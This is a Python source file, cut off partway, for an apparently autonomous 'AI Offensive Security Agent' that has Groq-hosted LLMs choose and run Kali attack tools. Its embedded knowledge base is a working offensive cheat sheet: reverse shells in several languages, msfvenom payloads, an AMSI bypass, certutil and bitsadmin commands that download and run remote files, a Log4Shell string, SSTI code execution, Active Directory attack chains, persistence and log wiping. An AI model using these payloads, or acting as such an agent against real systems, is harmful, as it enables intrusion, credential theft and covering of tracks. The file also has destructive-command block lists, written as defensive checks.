#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║           ATHENA — AI Offensive Security Agent v7.0              ║
║   Bare-metal Kali NetHunter | sdm845 | Phosh UI                  ║
║   Commander: The Priest                                           ║
║                                                                    ║
║   v7.0 ARCHITECTURAL REWRITE                                      ║
║                                                                    ║
║   • Pentesting Task Tree (PTT) — hierarchical state, no more     ║
║     flat findings dict; every subtask tracked todo/done/dead-end ║
║   • Specialist agent dispatcher — recon/web/network/AD/privesc/   ║
║     cred/exfil/reporter system prompts auto-selected per phase   ║
║   • Source-tagged finding extraction — every finding linked to    ║
║     the exact stdout it came from; phantoms can't sneak in       ║
║   • Tool-wrapper layer — typed builders for nmap/gobuster/hydra/ ║
║     sqlmap/etc.; LLM picks args, we build the shell string       ║
║   • PoC verification queue — claimed creds get verified through  ║
║     y/n gate before being marked real                            ║
║   • Confidence filter (green/yellow/red) — yellow forces 2-      ║
║     option pivot; red blocks command, demands more recon         ║
║   • Cleanup pass on report — unverified noise dropped before     ║
║     the report writes                                             ║
║   • Comprehensive Kali tool registry — 200+ tools known          ║
║   • Groq-only provider chain, biggest model first                 ║
║   • No on-disk persistence — every session is a fresh state      ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import signal
import datetime
import subprocess
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Any, Tuple

try:
    from groq import Groq
except ImportError:
    print("FATAL: groq package not installed. Run: pip install groq")
    sys.exit(1)

try:
    import readline  # noqa: F401  (enables arrow keys in input())
except ImportError:
    pass


# ═════════════════════════════════════════════════════════════════════
# VERSION & PROVIDER CHAIN  (Groq only, biggest→smallest)
# ═════════════════════════════════════════════════════════════════════

VERSION = "7.0"

# Strict size descending. Compound models last because they have their
# own internal multi-step behaviour that fights our PTT control flow.
PROVIDER_CHAIN = [
    ("openai/gpt-oss-120b",                            "GPT-OSS 120B"),
    ("llama-3.3-70b-versatile",                        "LLaMA 3.3 70B"),
    ("qwen/qwen3-32b",                                 "Qwen3 32B"),
    ("openai/gpt-oss-20b",                             "GPT-OSS 20B"),
    ("meta-llama/llama-4-scout-17b-16e-instruct",      "LLaMA 4 Scout 17B"),
    ("llama-3.1-8b-instant",                           "LLaMA 3.1 8B"),
    ("allam-2-7b",                                     "Allam 2 7B"),
    ("groq/compound",                                  "Groq Compound"),
    ("groq/compound-mini",                             "Compound Mini"),
]


# ═════════════════════════════════════════════════════════════════════
# PATHS, LIMITS, MARKERS
# ═════════════════════════════════════════════════════════════════════

INSTALL_DIR = os.path.expanduser("~/.athena")
LOG_DIR     = os.path.join(INSTALL_DIR, "logs")
BOOT_LOCK   = "/tmp/athena_session.lock"

MAX_HISTORY_MESSAGES = 16
MAX_OUTPUT_CHARS     = 5000
MAX_TOKENS_DEFAULT   = 2048
WORKFLOW_DONE        = "WORKFLOW_COMPLETE"

# Stuck thresholds
STUCK_THRESHOLD      = 3   # rejects/repeats before pivot
NODE_ATTEMPT_LIMIT   = 4   # attempts on a single PTT node before mark dead-end


# ═════════════════════════════════════════════════════════════════════
# SAFETY LISTS  (carried over from v6.1 — these work)
# ═════════════════════════════════════════════════════════════════════

BANNED_COMMANDS = [
    "apt upgrade", "apt full-upgrade",
    "apt-get upgrade", "apt-get full-upgrade", "apt dist-upgrade",
]
BANNED_UPGRADE_PACKAGES = ["phosh", "lightdm", "xfce", "x11", "gnome-shell"]

DESTRUCTIVE_COMMANDS = [
    r'\brm\s+-rf\s+/',
    r'\brm\s+-rf\s+\*',
    r'\brm\s+-rf\s+~',
    r'\bdd\s+if=',
    r'\bmkfs\b',
    r'>\s*/dev/sd[a-z]',
    r':\(\)\{.*\|.*&.*\};:',
    r'\bchmod\s+-R\s+777\s+/',
    r'\bchown\s+-R.*\s+/',
    r'\bshutdown\b',
    r'\bhalt\b',
    r'\binit\s+0',
    r'\binit\s+6',
    r'\bpoweroff\b',
]

DOUBLE_CONFIRM = [
    r'systemctl\s+(stop|disable|mask)',
    r'service\s+\S+\s+stop',
    r'iptables\s+-F',
    r'ufw\s+disable',
    r'>\s*/etc/',
    r'sed\s+-i.*\s+/etc/',
    r'echo.*>>\s*/etc/',
    r'echo.*>\s*/etc/',
    r'chmod\s+\+s\s+',
    r'useradd\s+',
    r'userdel\s+',
    r'passwd\s+',
    r'\bkillall\b',
]

INTERACTIVE_BLOCKED = {
    "msfconsole":   "Use: msfconsole -q -r /tmp/script.rc (script must end with 'exit')",
    "mysql -u":     "Use: mysql -u USER -pPASS -e 'QUERY;' for non-interactive query",
    "psql":         "Use: psql -c 'QUERY;' for non-interactive query",
    "telnet":       "Use: nc -nv [IP] [PORT] for one-shot banner grab",
    "nc -l":        "Listener blocked — would hang Athena. Run in separate terminal.",
    "ncat -l":      "Listener blocked — would hang Athena. Run in separate terminal.",
    "vim ":         "Use: cat or sed for non-interactive file ops",
    "vi ":          "Use: cat or sed for non-interactive file ops",
    "nano ":        "Use: cat or sed for non-interactive file ops",
    "less ":        "Use: cat or head/tail for non-interactive viewing",
    "more ":        "Use: cat or head/tail for non-interactive viewing",
    "top":          "Use: ps aux for non-interactive process list",
    "htop":         "Use: ps aux for non-interactive process list",
    "ssh ":         "SSH interactive — use sshpass -p PASS ssh user@host 'CMD' instead",
    "ftp ":         "FTP interactive — use curl ftp://user:pass@host/file instead",
    "gdb ":         "GDB interactive — use gdb -batch -ex 'cmd' instead",
}


# ═════════════════════════════════════════════════════════════════════
# COMPREHENSIVE KALI TOOL REGISTRY
#
# Athena uses this both to (a) tell the AI what's available so it stops
# proposing tools that don't exist, and (b) auto-install missing tools
# on demand.  Categorised for quick lookup by phase.
# ═════════════════════════════════════════════════════════════════════

KALI_TOOLS = {
    "network_recon": [
        "nmap", "masscan", "rustscan", "arp-scan", "fping", "netdiscover",
        "unicornscan", "zmap", "naabu", "zenmap",
    ],
    "service_enum": [
        "enum4linux", "enum4linux-ng", "smbclient", "smbmap", "rpcclient",
        "showmount", "nbtscan", "snmpwalk", "snmp-check", "onesixtyone",
        "ldapsearch", "redis-cli", "mongo", "mysql", "psql",
        "ldapenum", "ldap-utils",
    ],
    "web_recon": [
        "whatweb", "wafw00f", "httprobe", "httpx", "katana", "hakrawler",
        "subfinder", "amass", "assetfinder", "findomain", "gau",
        "waybackurls", "gospider",
    ],
    "web_brute": [
        "gobuster", "feroxbuster", "ffuf", "dirb", "dirsearch", "wfuzz",
        "arjun", "paramspider", "x8",
    ],
    "web_vuln": [
        "nikto", "nuclei", "wpscan", "joomscan", "droopescan", "cmsmap",
        "skipfish", "wapiti", "vega", "zap-baseline", "nuclei-templates",
        "owasp-zap", "burpsuite",
    ],
    "web_exploit": [
        "sqlmap", "commix", "tplmap", "xsstrike", "dalfox", "kxss",
        "nosqlmap", "ghauri", "jsql-injection",
    ],
    "ad_recon": [
        "enum4linux", "enum4linux-ng", "ldapsearch", "rpcclient", "kerbrute",
        "bloodhound", "bloodhound-python", "windapsearch", "adidnsdump",
        "powerview", "ad-ldap-enum", "sharphound",
    ],
    "ad_exploit": [
        "impacket-GetNPUsers", "impacket-GetUserSPNs", "impacket-secretsdump",
        "impacket-psexec", "impacket-wmiexec", "impacket-smbexec",
        "impacket-atexec", "impacket-ticketer", "impacket-getTGT",
        "impacket-goldenPac", "crackmapexec", "netexec", "certipy",
        "petitpotam", "printerbug", "coercer", "responder", "ntlmrelayx",
        "evil-winrm", "ldap2json", "rubeus",
    ],
    "credential": [
        "hydra", "medusa", "patator", "ncrack", "crackmapexec", "netexec",
        "kerbrute", "cewl", "crunch", "cupp", "username-anarchy",
    ],
    "cracking": [
        "hashcat", "john", "hashid", "hash-identifier", "ophcrack",
        "pyrit", "rsmangler", "cewl", "rsmangler",
    ],
    "exploit_db": [
        "searchsploit", "exploitdb", "msfconsole", "msfvenom", "msf-pro",
        "metasploit-framework",
    ],
    "post_exploit_linux": [
        "linpeas.sh", "linenum.sh", "lse.sh", "linux-exploit-suggester",
        "linux-exploit-suggester-2", "pspy", "unix-privesc-check",
        "linuxprivchecker", "gtfobins-cli",
    ],
    "post_exploit_windows": [
        "winpeas.exe", "winpeas.bat", "powerup.ps1", "sherlock.ps1",
        "watson.exe", "seatbelt.exe", "accesschk", "powerless",
        "windows-exploit-suggester", "wesng",
    ],
    "tunneling": [
        "chisel", "ligolo-ng", "socat", "ssh", "sshuttle", "ngrok",
        "frp", "gost", "iodine", "dnscat2", "ptunnel-ng",
    ],
    "wireless": [
        "aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng",
        "wifite", "kismet", "reaver", "bully", "pixiewps", "hcxdumptool",
        "hcxtools", "bettercap", "wifiphisher", "fluxion", "fern-wifi-cracker",
    ],
    "bluetooth": [
        "hciconfig", "hcitool", "sdptool", "bluetoothctl", "btscanner",
        "blueranger", "spooftooph", "redfang", "rfcomm",
    ],
    "rfid_nfc": [
        "mfoc", "mfcuk", "proxmark3", "libnfc", "nfc-list",
    ],
    "evasion": [
        "veil", "shellter", "msfvenom", "donut", "phantom-evasion",
        "obfuscapk", "macchanger", "proxychains4",
    ],
    "forensics": [
        "volatility3", "volatility", "binwalk", "foremost", "scalpel",
        "autopsy", "sleuthkit", "bulk_extractor", "guymager", "dc3dd",
        "dd_rescue", "testdisk", "photorec",
    ],
    "stego": [
        "steghide", "stegseek", "zsteg", "outguess", "openstego",
        "stegoveritas", "exiftool", "exiv2", "pngcheck", "stegsolve",
    ],
    "reverse_engineering": [
        "ghidra", "radare2", "rizin", "cutter", "gdb", "gdb-multiarch",
        "ltrace", "strace", "objdump", "readelf", "nm", "checksec",
        "ropper", "ROPgadget", "pwntools", "angr", "frida", "apktool",
    ],
    "mobile": [
        "apktool", "dex2jar", "jadx", "frida", "objection", "drozer",
        "mobsf", "androguard", "qark",
    ],
    "osint": [
        "theharvester", "maltego", "spiderfoot", "recon-ng", "shodan",
        "sherlock", "holehe", "phoneinfoga", "exiftool", "metagoofil",
        "fierce", "dnsenum", "dnsrecon", "dnstwist", "sublist3r",
        "subfinder", "amass",
    ],
    "container_cloud": [
        "docker", "kubectl", "kube-hunter", "kube-bench", "trivy",
        "grype", "syft", "checkov", "tfsec", "prowler", "scoutsuite",
        "cloudsploit", "pacu", "cloudfox", "peirates",
    ],
    "fuzzing": [
        "ffuf", "wfuzz", "afl-fuzz", "honggfuzz", "boofuzz", "radamsa",
        "patator", "ftpfuzz",
    ],
    "ssl_tls": [
        "sslscan", "sslyze", "testssl.sh", "tlssled", "openssl",
    ],
    "dns": [
        "dig", "host", "nslookup", "dnsrecon", "dnsenum", "dnstwist",
        "fierce", "dnscan", "amass", "puredns",
    ],
    "misc_useful": [
        "curl", "wget", "nc", "ncat", "socat", "tmux", "screen",
        "jq", "tee", "xxd", "hexdump", "base64", "openssl", "tshark",
        "tcpdump", "wireshark", "ettercap", "bettercap", "mitmproxy",
        "responder", "git", "python3", "pip3",
    ],
}


def all_kali_tools_flat() -> List[str]:
    seen = set()
    flat = []
    for cat, tools in KALI_TOOLS.items():
        for t in tools:
            if t not in seen:
                seen.add(t)
                flat.append(t)
    return flat


def kali_tool_summary_for_prompt() -> str:
    """Compressed list for system prompts so AI knows what's available."""
    parts = []
    for cat, tools in KALI_TOOLS.items():
        # Trim to the most important per category to save tokens
        parts.append(f"  {cat}: {', '.join(tools[:10])}")
    return "KALI ARSENAL AVAILABLE:\n" + "\n".join(parts)


# ═════════════════════════════════════════════════════════════════════
# FINDING PATTERNS — strict, context-aware
#
# Lessons from v6.1: regex like `(?:password|pass)[:\s=]+(\S+)` matches
# the AI's own thinking ("...try password: helper...") and pollutes
# state.  v7.0 only runs these on raw subprocess stdout, never on the
# model's text.  Patterns are also tightened so noise like "200:not"
# (which came from "user:200, pass:not" in the AI's prose) can't match.
# ═════════════════════════════════════════════════════════════════════

FINDING_PATTERNS = {
    # IPv4 addresses
    "ip":        r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',

    # Open ports from nmap-style output: "22/tcp open ssh"
    # Only capture the port number — service name comes via 'svc' key
    "port":      r'(\d{1,5})/(?:tcp|udp)\s+open\s+\S+',

    # Service+version: "22/tcp open ssh OpenSSH 8.2p1"
    "svc":       r'\d+/(?:tcp|udp)\s+open\s+\S+\s+([A-Za-z][A-Za-z0-9\-_\. ]{2,60}\d+(?:\.\d+)*[A-Za-z0-9]*)',

    # Usernames found in tool output (NOT prose) — needs preceding label
    "user":      r'(?:^|\n|\s)(?:Username|User|Login|sAMAccountName|uid)[:\s=]+([a-zA-Z][a-zA-Z0-9_\.\-]{2,32})\b',

    # NTLM hashes (LM:NTLM)
    "hash_ntlm": r'\b([a-fA-F0-9]{32}:[a-fA-F0-9]{32})\b',

    # Generic hex hash 32-64 chars on its own line/field (avoids matching cve numbers)
    "hash":      r'(?:^|\n|\s|:|=)([a-fA-F0-9]{32,64})(?:\s|$|:)',

    # Kerberos AS-REP / TGS-REP hashes
    "krb_hash":  r'(\$krb5(?:asrep|tgs)\$\S+)',

    # NetNTLMv2
    "ntlmv2":    r'([^\s]+::[^:]+:[a-fA-F0-9]{32}:[a-fA-F0-9]+)',

    # CVEs
    "cve":       r'\b(CVE-\d{4}-\d{4,7})\b',

    # Domains (broad — gets filtered)
    "domain":    r'\b([a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z]{2,})+)\b',

    # URLs
    "url":       r'(https?://[^\s\'"<>]+)',

    # Credentials — REQUIRES colon or equals after the field name.
    # Word boundary on the left prevents matching "Mypassword:".
    # Whitespace-only separator is rejected (kills prose like "password not").
    "cred":      r'(?<![a-zA-Z])(?:[Pp]assword|[Pp]asswd|[Cc]redentials?)\s*[:=]\s*(\S{4,64})\b',

    # SMB shares
    "smb_share": r'\\\\[\d\.]+\\([A-Za-z0-9_\-\$]+)',

    # Email addresses
    "email":     r'\b([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})\b',

    # SSH private key markers
    "ssh_key":   r'(-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----)',

    # AWS-style keys
    "aws_key":   r'\b(AKIA[0-9A-Z]{16})\b',
}

# These IPs are noise — don't add them as findings
IP_NOISE = {
    '0.0.0.0', '127.0.0.1', '255.255.255.255',
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '169.254.169.254',  # cloud metadata — noted elsewhere, not a finding
}

# Domains that are noise (shown in command outputs but not real findings)
DOMAIN_NOISE = {
    'localhost', 'example.com', 'google.com', 'cloudflare.com',
    'localdomain', 'arpa', 'in-addr.arpa',
}


# Sensitive paths to flag as "exposed_path" findings if found in output
SENSITIVE_PATH_PATTERNS = [
    r'\.ssh/',
    r'\.bash_history',
    r'\.bashrc\b',
    r'\.git/',
    r'\.env\b',
    r'\.aws/',
    r'wp-config\.php',
    r'config\.php',
    r'/etc/passwd',
    r'/etc/shadow',
    r'/etc/hosts',
    r'id_rsa\b',
    r'id_ed25519\b',
    r'id_ecdsa\b',
    r'authorized_keys',
    r'\.htpasswd',
    r'web\.config',
    r'database\.yml',
    r'application\.properties',
    r'\.npmrc\b',
    r'\.docker/config\.json',
    r'\.kube/config',
]


# Wordlists for credential attacks (fallback to hardcoded if files missing)
CRED_WORDLISTS = [
    "/usr/share/wordlists/metasploit/common_passwords.txt",
    "/usr/share/wordlists/fasttrack.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt",
    "/usr/share/seclists/Passwords/probable-v2-top1575.txt",
]

FALLBACK_PASSWORDS = [
    "admin", "password", "123456", "root", "toor", "kali",
    "admin123", "password123", "letmein", "welcome", "default",
    "Password1", "Passw0rd!", "P@ssw0rd", "changeme", "qwerty",
]


# Exit-code semantics for run_command return values
EXEC_SESSION_EXIT       = "__SESSION_EXIT__"
EXEC_INTERACTIVE_BLOCKED = "__INTERACTIVE_BLOCKED__"
EXEC_REJECTED           = "__COMMAND_REJECTED__"
EXEC_DESTRUCTIVE        = "__DESTRUCTIVE_REFUSED__"


# ═════════════════════════════════════════════════════════════════════
# KNOWLEDGE BASE — extended from v6.1 with Athena-specific patterns
# ═════════════════════════════════════════════════════════════════════

KB = {}

KB[1] = r"""
S1 OPERATOR MINDSET:
Pick the minimum-path action toward the current PTT node's goal.
Map trust boundaries (web→DB→AD→cloud).  Every command costs noise:
nmap -p- = LOUD, gobuster = MEDIUM, curl single = QUIET.
APT-tier discipline: every command must be deliberate, justified,
and traceable.  Never run anything you can't explain in one sentence.
Three approaches per goal — fall back fast when one fails."""

KB[2] = r"""
S2 NETWORK RECON:
Host discovery: arp-scan -l | fping -ag CIDR | masscan ping
Port scan fast: nmap -sS -T4 --min-rate 5000 -p- | rustscan -a IP
Service detection: nmap -sV -sC -p PORTS
Banner grab: nc -nv IP PORT (one-shot) | curl -sI URL
Stealth: nmap -T1 --scan-delay 5s -f --mtu 8 -D RND:10
UDP top 20: nmap -sU -F (slow but reveals snmp/dns/ntp/ipp)
Script categories: --script vuln | smb-* | http-* | ssl-* | ftp-*
OS fingerprint: nmap -O -A (loud)
ARP/MAC: arp-scan -l --interface=IFACE
Sniff: tcpdump -i IFACE -nn -A | tshark -i IFACE"""

KB[3] = r"""
S3 WEB EXPLOITATION:
Manual recon first — automated tools miss business logic.
Tech ID: whatweb -a 3 URL | wafw00f URL | curl -sI URL | nuclei -t technologies
Dir brute: feroxbuster -u URL -w wordlist -x php,html,txt,bak,zip,old
  Wildcard? feroxbuster --filter-status 200,403 if everything 200
Vhost: gobuster vhost -u URL -w subdomains.txt
SQLi tests: ' OR '1'='1'-- | ' UNION SELECT NULL-- (NULLs++ till no err)
  sqlmap -u URL --batch --random-agent --level=3 --risk=2 --dbs
  File read: ' UNION SELECT load_file('/etc/passwd'),NULL-- (mysql)
XSS: <img src=x onerror=alert(1)> | <svg onload=alert(1)> | <iframe srcdoc>
SSRF: http://169.254.169.254/latest/meta-data/ (AWS IMDSv1)
       http://metadata.google.internal/computeMetadata/v1/ (GCP, needs Metadata-Flavor: Google)
       http://localhost:PORT (internal services)
LFI→RCE: read /etc/passwd → poison logs → include log
XXE: <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
SSTI test: {{7*7}} ${7*7} <%=7*7%> — 49 in response = confirmed
  Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
JWT: cut -d. -f2 then base64 -d; try alg:none; brute with hashcat -m 16500
File upload: change Content-Type, double ext (.php.jpg), null byte, .phtml/.php5
Insecure deserialization: ysoserial.net for .NET, ysoserial for Java"""

KB[4] = r"""
S4 ACTIVE DIRECTORY KILL CHAIN:
Pre-auth → AS-REP roast → crack → authenticated → ACL abuse → DCSync
AS-REP (no creds): impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip DC
  Crack: hashcat -m 18200 hash rockyou.txt
Kerberoast (any user): impacket-GetUserSPNs domain/u:p -dc-ip DC -request
  Crack: hashcat -m 13100 hash rockyou.txt
Pass-the-hash: impacket-psexec dom/u@IP -hashes :NTLM | nxc smb IP -u u -H NTLM
DCSync (DA): impacket-secretsdump dom/admin:pwd@DC
Golden: impacket-ticketer -nthash KRBTGT -domain-sid SID -domain DOM Administrator
Zerologon: nxc smb DC -M zerologon | impacket-zerologon DC_HOST DC_IP
PrintNightmare: ms-rprn / spoolss exploits via impacket
ADCS ESC1-8: certipy find -u u@dom -p p -dc-ip DC | certipy req -upn admin@dom
NTLM relay: responder -I IFACE | ntlmrelayx.py -tf targets.txt -smb2support
Coerce auth: petitpotam DC ATK | coercer coerce -u U -p P -t TGT -l LISTENER
ACL abuse: GenericAll=reset pwd | WriteDACL=grant rights | GenericWrite=set SPN
LDAP: ldapsearch -x -H ldap://DC -b "DC=dom,DC=local" -D "u@dom" -w pwd
BloodHound collection: bloodhound-python -u U -p P -d DOM -ns DC -c All"""

KB[5] = r"""
S5 LINUX PRIVESC:
Sudo GTFOBins: vim→:!sh | find→sudo find / -exec /bin/sh \;
  python3→import os;os.system("/bin/sh") | awk→awk 'BEGIN{system("/bin/sh")}'
  less→!/bin/sh | nano→^R^X reset; sh
SUID: find / -perm -4000 -type f 2>/dev/null
  /usr/bin/find -exec /bin/sh -p \;
  /usr/bin/python -c 'import os;os.execl("/bin/sh","sh","-p")'
Cron: cat /etc/crontab; ls -la /etc/cron.*  (writable script = win)
  Wildcard injection: tar with * + --checkpoint-action
Capabilities: getcap -r / 2>/dev/null
  cap_setuid: python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
Docker group: docker run -v /:/mnt -it alpine chroot /mnt /bin/bash
LXD/LXC: similar — image inject + privileged container
Writable /etc/passwd: openssl passwd -1 P → echo 'r2:HASH:0:0::/:/bin/sh' >> 
NFS no_root_squash: mount, cp $(which sh) ., chmod +s, ./sh -p (locally)
Kernel CVE: linux-exploit-suggester | uname -r → searchsploit
DirtyPipe (5.8-5.16.11): CVE-2022-0847
PwnKit (pkexec): CVE-2021-4034 — works on most distros 2009+
Sudo Baron Samedit (<1.9.5p2): CVE-2021-3156"""

KB[6] = r"""
S6 WINDOWS PRIVESC:
SeImpersonatePrivilege (whoami /priv):
  Win10/Server 2019+: PrintSpoofer
  Server 2012-2022: GodPotato
  Server 2008-2016: JuicyPotato (port 6666 by default)
SeBackupPrivilege: dump SAM/SYSTEM, parse with secretsdump
SeRestorePrivilege: write to protected paths
Unquoted service paths: wmic service get name,pathname,startmode | findstr /i auto
  Place binary at first space-break in path → restart svc as SYSTEM
AlwaysInstallElevated: reg query HKCU/HKLM AlwaysInstallElevated (both =1)
  msfvenom -p windows/exec CMD='net user p P /add' -f msi → msiexec /quiet /i p.msi
Stored creds: cmdkey /list | reg query HKLM /f password /t REG_SZ /s
  dir /s *pass* *cred* | findstr /si password *.txt *.xml *.config
Weak service ACL: accesschk -uwcqv "Authenticated Users" *
  sc config SVC binPath= "cmd /c payload"
Missing patches: systeminfo > si.txt | wesng -i si.txt
DLL hijack: procmon → NAME NOT FOUND with .dll → drop in writable dir
Token impersonation (with admin): incognito module / Tokenvator"""

KB[7] = r"""
S7 POST-EXPLOITATION:
LOTL Linux: bash python3 perl ruby php nc socat curl wget find awk base64 openssl
LOTL Windows: cmd powershell certutil bitsadmin msiexec regsvr32 rundll32 wmic mshta
Persistence Linux: ~/.bashrc | crontab -e | ~/.ssh/authorized_keys | systemd unit
  /etc/rc.local | LD_PRELOAD | apt/yum hook | motd-news
Persistence Win: HKCU\...\Run | HKLM\...\Run | schtasks /create
  sc create | WMI subscription | scheduled tasks | startup folder
Log clean: history -c && history -w | unset HISTFILE | echo > ~/.bash_history
  > /var/log/auth.log (needs root, noisy if monitored)
Pivot Linux: ssh -L | ssh -D (SOCKS) | socat TCP-LISTEN:P,fork TCP:T:P
Pivot Win: netsh interface portproxy add v4tov4
Chisel: server side `chisel server -p 9000 --reverse`
        client side `chisel client SVR:9000 R:8080:internal:80`
Ligolo-ng: modern alternative — better tunnel performance than chisel
Cred hunt Linux: find / -name id_rsa 2>/dev/null | grep -r -E 'pass|secret' /etc 2>/dev/null
  cat ~/.bash_history ~/.zsh_history ~/.aws/credentials ~/.docker/config.json
Cred hunt Win: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  netsh wlan show profile name=SSID key=clear | type %APPDATA%\..\Local\..."""

KB[8] = r"""
S8 HIGH-VALUE CVES (PRIORITISE THESE):
Apache 2.4.49 / 2.4.50 — CVE-2021-41773/42013 path traversal RCE
  curl --path-as-is 'http://t/cgi-bin/.%2F.%2F.%2Fetc/passwd'
EternalBlue — MS17-010 (Win 7/2008/2012)
  nmap --script smb-vuln-ms17-010 | metasploit ms17_010_eternalblue
BlueKeep — CVE-2019-0708 (RDP, Win XP-7/2003-2008R2)
Zerologon — CVE-2020-1472 (any DC pre-Aug 2020 patch)
PrintNightmare — CVE-2021-34527 (any unpatched Win)
Shellshock — CVE-2014-6271 (bash CGI)
  curl -H 'User-Agent: () { :; }; cat /etc/passwd' http://t/cgi-bin/X.cgi
Log4Shell — CVE-2021-44228 (Log4j 2.x, ${jndi:ldap://attacker/a})
Heartbleed — CVE-2014-0160 (OpenSSL 1.0.1 → 1.0.1f)
DirtyCOW — CVE-2016-5195 (Linux <4.8.3)
DirtyPipe — CVE-2022-0847 (Linux 5.8 → 5.16.11)
PwnKit — CVE-2021-4034 (polkit pkexec, almost everywhere)
Sudo Baron Samedit — CVE-2021-3156
Spring4Shell — CVE-2022-22965
Confluence OGNL — CVE-2022-26134, CVE-2023-22515, CVE-2023-22527
Atlassian Jira — CVE-2022-0540, CVE-2024-1597
Citrix NetScaler — CVE-2023-3519, CVE-2023-4966
F5 BIG-IP — CVE-2022-1388, CVE-2023-46747
GitLab — CVE-2023-7028, CVE-2024-7965
PaperCut — CVE-2023-27350
Ivanti — CVE-2023-46805/CVE-2024-21887, CVE-2024-21893"""

KB[9] = r"""
S9 EVASION:
AMSI bypass PS: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
ETW bypass: patch EtwEventWrite in ntdll
Payload obfuscation: msfvenom -e x64/xor_dynamic -i 10
  Veil-Evasion | Donut shellcode | shellter for legit binary backdoor
LOTL delivery: certutil -urlcache -split -f http://A/s.exe s.exe
  bitsadmin /transfer j http://A/s.exe %TEMP%\s.exe
Network evasion: HTTPS C2 :443, randomise UA, jitter timing, low TTL
File upload bypass: image/jpeg with PHP, .php.jpg, .PhP, .phtml, .phar
Frag/decoy: nmap -f --mtu 8 | -D RND:10 --data-length 25 | --source-port 53
Slow recon: nmap -T1 --scan-delay 10s --max-retries 1
MAC spoof: macchanger -r IFACE
Proxychains: edit /etc/proxychains4.conf, prefix command with proxychains4"""

KB[10] = r"""
S10 CREDENTIAL ATTACKS:
Default creds quick wins:
  router admin/admin admin/password root/root | tomcat tomcat/tomcat
  jenkins admin/admin | jboss admin/vagrant | mysql root/(blank)
  redis (no auth often) | mongo (no auth pre-3.0) | elasticsearch (no auth)
  postgres postgres/postgres | gitlab root/5iveL!fe (old default)
Hash modes (hashcat):
  MD5=0 | SHA1=100 | NTLM=1000 | NTLMv2=5600 | bcrypt=3200
  WPA2/WPA3=22000 | LM=3000 | Kerberoast=13100 | AS-REP=18200
  MSCachev2=2100 | MySQL5=300 | MSSQL2012=1731 | LDAP-SHA1=101
Wordlists priority: rockyou.txt → fasttrack → SecLists/Passwords
Spray timing AD: default lockout 5/30min — 1 password / 30min across all users
  nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success
Cred reuse: any creds found → test SSH, SMB, RDP, FTP, web admin, mysql, vpn"""

KB[11] = r"""
S11 METASPLOIT (NON-INTERACTIVE):
Always verify module exists before scripting:
  msfconsole -q -x 'search MODULE; exit' | grep -i exploit
Verified high-impact modules:
  exploit/windows/smb/ms17_010_eternalblue
  exploit/windows/smb/ms17_010_psexec
  exploit/multi/handler  (catch reverse shells)
  exploit/unix/ftp/vsftpd_234_backdoor
  exploit/unix/irc/unreal_ircd_3281_backdoor
  exploit/windows/http/rejetto_hfs_exec
  exploit/multi/http/jenkins_script_console
  exploit/multi/http/log4shell_header_injection
  auxiliary/scanner/smb/smb_ms17_010
  auxiliary/scanner/portscan/tcp
  auxiliary/scanner/smb/smb_login
  auxiliary/scanner/ssh/ssh_login
  auxiliary/scanner/ftp/ftp_login
  post/multi/recon/local_exploit_suggester
  post/linux/gather/hashdump
  post/windows/gather/hashdump
RC script template (LAST LINE MUST BE 'exit'):
  use exploit/...
  set RHOSTS T
  set LHOST L
  set LPORT 4444
  set ExitOnSession false
  run -j
  exit
Run: msfconsole -q -r /tmp/x.rc"""

KB[12] = r"""
S12 REVERSE SHELLS & PAYLOADS:
bash:        bash -i >& /dev/tcp/L/4444 0>&1
bash alt:    0<&196;exec 196<>/dev/tcp/L/4444; sh <&196 >&196 2>&196
python3:     python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("L",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
nc mkfifo:   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc L 4444 >/tmp/f
php:         php -r '$s=fsockopen("L",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
perl:        perl -e 'use Socket;$i="L";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby:        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("L","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
PowerShell:  powershell -nop -W hidden -c "$c=New-Object Net.Sockets.TCPClient('L',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
msfvenom WINx64: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=L LPORT=4444 -f exe -o s.exe
msfvenom LIN64:  msfvenom -p linux/x64/shell_reverse_tcp LHOST=L LPORT=4444 -f elf -o s.elf
Listener:    rlwrap nc -lvnp 4444  (rlwrap gives arrow-key history)
TTY upgrade after shell:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z; stty raw -echo; fg; reset; export TERM=xterm; export SHELL=bash"""

KB[13] = r"""
S13 NETWORK SERVICE QUICKREF:
